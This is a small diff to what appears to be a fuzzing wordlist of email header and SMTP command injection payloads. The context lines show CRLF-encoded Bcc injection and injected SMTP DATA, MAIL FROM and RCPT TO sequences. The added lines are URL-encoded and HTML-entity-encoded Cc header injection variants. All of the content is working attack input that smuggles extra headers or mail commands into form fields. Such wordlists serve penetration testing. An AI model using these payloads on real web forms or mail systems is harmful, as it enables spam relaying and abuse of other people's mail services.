@@ -5,3 +5,5 @@
 <youremail>%0d%0aBcc:<youremail>
 %0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo%0a%2e%0a
 %0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+%3Cyouremail%3E%250d%250aCc%3A%3Cyouremail%3E
+&lt;youremail&gt;&#37;0d&#37;0aCc:&lt;youremail&gt;
